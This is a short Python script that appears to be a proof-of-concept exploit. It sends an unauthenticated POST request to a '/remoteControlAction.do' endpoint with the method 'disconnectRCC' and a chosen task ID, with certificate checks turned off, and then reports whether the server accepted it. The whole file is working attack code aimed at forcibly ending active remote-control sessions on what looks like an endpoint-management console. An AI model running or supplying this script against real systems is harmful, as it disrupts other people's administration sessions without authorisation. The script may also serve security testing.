#!/usr/bin/env python3
import argparse

import requests
import urllib3


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("task_id", type=int, help="active remote-control task ID")
    parser.add_argument("--target", default="https://192.168.1.14:8443")
    args = parser.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    response = requests.post(
        args.target.rstrip("/") + "/remoteControlAction.do",
        data={"method": "disconnectRCC", "taskID": str(args.task_id)},
        allow_redirects=False,
        verify=False,
        timeout=30,
    )
    print(f"http={response.status_code} set_cookie={'Set-Cookie' in response.headers} body={response.text.strip()!r}")


if __name__ == "__main__":
    main()
